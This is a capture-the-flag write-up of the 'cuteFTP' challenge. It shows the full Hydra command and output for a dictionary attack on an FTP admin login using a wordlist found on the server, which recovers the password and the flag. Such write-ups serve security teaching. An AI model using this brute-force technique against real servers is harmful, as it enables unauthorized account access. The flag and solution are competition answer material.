# cuteFTP (Misc - 120 pts)

### [~$ cd ..](../)

Author: [alect096](https://alect096.github.io/CTFs/CSCBE2019/finals_saturday/cuteFTP/)

> A chaotic admin set up an FTP challenge but might have misplaced some files.
> 63.35.125.97:21

We firstly logged in as anonymous without password. We were able to access to some files and folders.

In those files we found a lot of pictures of cats, [lists of words](kublaiBADPASSWORDS.list) and a [list of users](users.list).
On the other hand we had a folder with subfolders representing the users. In the admin folder we found a [README.txt](README.txt), here is the content:

> Please don't abuse this server! This FTP server is used to share my favourite cats (there's only one thing I like more than cats). Feel free to browse through them and download your favourites. If you want to add your own cats shoot me a mail (darthcatlover9001@sharklasers.com) and I'll give you a user account. The cats you add will then appear in the /users/username/public folder.
>
> If you're into lists instead of cats you might also like my other FTP server. I sometimes get confused so if I misplaced a list on this server please let me know.
>
> ~JarJar B. McPaws~

And a [thanksto.txt](thanksto.tx) containing:

> Thanks to:  
> -Maxogden (for helping me start my collection)  
> -Charlottd  
> -Charlottf  
> -Dennis  

Thanks to the list, we thought about launching a dictionary attack on the FTP service to try to log in with the admin account.

We decided to use Hydra to perform this action.

> hydra 52.17.165.245 ftp -l admin -P /root/Desktop/kublaiBADPASSWORDS.list  
> 	Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
>
>	Hydra (http://www.thc.org/thc-hydra) starting at 2019-03-30 11:29:09
> 	
>	[DATA] max 16 tasks per 1 server, overall 16 tasks, 666 login tries (l:1/p:666), ~42 tries per task  
>	[DATA] attacking ftp://52.17.165.245:21/  
>	[STATUS] 96.00 tries/min, 96 tries in 00:01h, 570 to do in 00:06h, 16 active  
>	[STATUS] 85.67 tries/min, 257 tries in 00:03h, 409 to do in 00:05h, 16 active  
>		[21][ftp] host: 52.17.165.245   login: admin   password: cookies  
>	1 of 1 target successfully completed, 1 valid password found  
>	[WARNING] Writing restore file because 2 final worker threads did not complete until end.
>	[ERROR] 2 targets did not resolve or could not be connected  
>	[ERROR] 16 targets did not complete  
>	Hydra (http://www.thc.org/thc-hydra) finished at 2019-03-30 11:36:07

We are now able to log in with the admin account and the password `cookies`.

On this account we found a file in the following path [/admin/flag.txt](flag.txt):

**CSC{I'm_a_flag-da-be-die-dabe-flag!}**
